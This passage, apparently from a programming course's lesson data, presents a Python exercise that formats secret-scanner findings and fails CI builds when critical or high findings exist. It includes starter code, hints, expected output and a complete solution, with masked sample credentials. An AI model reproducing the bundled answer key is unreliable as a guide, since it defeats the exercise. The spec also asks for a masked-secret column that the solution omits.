WHY: A scanner is only useful if it blocks the pipeline when secrets are found. Exit code 1 causes GitHub Actions, GitLab CI, and Jenkins to fail the build automatically. Severity-sorted, columnar output gives developers the information they need to remediate quickly.

HOW: Sort findings by severity order (critical first). Print a table with file path (truncated), line number, pattern name, and masked secret. Print a summary count. Return sys.exit(1) if any critical or high finding exists, sys.exit(0) otherwise.`,
        starterCode: `# Secret Scanner — Step 4: CI-Ready Output
import sys
from dataclasses import dataclass

@dataclass
class SecretFinding:
    file_path: str
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

def print_report(findings: list[SecretFinding]) -> int:
    """Print a formatted report. Returns exit code (0=clean, 1=findings)."""
    if not findings:
        print("No secrets detected. Repository is clean.")
        return 0

    # TODO:
    # 1. Sort findings by severity: critical → high → medium → low
    # 2. Print a header row
    # 3. Print each finding, truncating file_path to 35 chars
    # 4. Print a summary: "Total: N findings (X critical, Y high)"
    # 5. Return 1 if any critical or high findings, else 0
    pass

# Test with sample findings
sample_findings = [
    SecretFinding("src/config.py", 12, "AWS Access Key", "critical", "AKIAIO***MPLE"),
    SecretFinding("scripts/deploy.sh", 5, "GitHub Token", "critical", "ghp_ab***3pqr"),
    SecretFinding("config/settings.yaml", 3, "Database Connection String", "high", "postgre***b/db"),
    SecretFinding("src/notifications.py", 88, "Slack Webhook", "medium", "https:***abcd"),
]

exit_code = print_report(sample_findings)
print(f"\\nExit code: {exit_code} ({'FAIL — blocking CI' if exit_code else 'PASS'})")`,
        hints: [
          'severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}',
          'Truncate path: path[-33:] if len(path) > 33 else path — prefix with ".." when truncated',
          'Count criticals: sum(1 for f in findings if f.severity == "critical")'
        ],
        expectedOutput: `SEVERITY     PATTERN                        FILE                                LINE
------------------------------------------------------------------------------------------
CRITICAL     AWS Access Key                 src/config.py                       12
CRITICAL     GitHub Token                   scripts/deploy.sh                   5
HIGH         Database Connection String     config/settings.yaml                3
MEDIUM       Slack Webhook                  src/notifications.py                88

Total: 4 findings (2 critical, 1 high)

Exit code: 1 (FAIL — blocking CI)`,
        solution: `import sys
from dataclasses import dataclass

@dataclass
class SecretFinding:
    file_path: str
    line_number: int
    pattern_name: str
    severity: str
    masked_text: str

def print_report(findings: list) -> int:
    if not findings:
        print("No secrets detected. Repository is clean.")
        return 0

    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda f: severity_order.get(f.severity, 99))

    print(f"{'SEVERITY':<12} {'PATTERN':<30} {'FILE':<35} {'LINE':<6}")
    print("-" * 90)
    for f in findings:
        short = (".." + f.file_path[-33:]) if len(f.file_path) > 35 else f.file_path
        print(f"{f.severity.upper():<12} {f.pattern_name:<30} {short:<35} {f.line_number:<6}")

    critical = sum(1 for f in findings if f.severity == "critical")
    high = sum(1 for f in findings if f.severity == "high")
    print(f"\\nTotal: {len(findings)} findings ({critical} critical, {high} high)")

    return 1 if (critical + high) > 0 else 0

sample_findings = [
    SecretFinding("src/config.py", 12, "AWS Access Key", "critical", "AKIAIO***MPLE"),
    SecretFinding("scripts/deploy.sh", 5, "GitHub Token", "critical", "ghp_ab***3pqr"),
    SecretFinding("config/settings.yaml", 3, "Database Connection String", "high", "postgre***b/db"),
    SecretFinding("src/notifications.py", 88, "Slack Webhook", "medium", "https:***abcd"),
]

exit_code = print_report(sample_findings)
print(f"\\nExit code: {exit_code} ({'FAIL — blocking CI' if exit_code else 'PASS'})")`
      }
    ]
  },
]
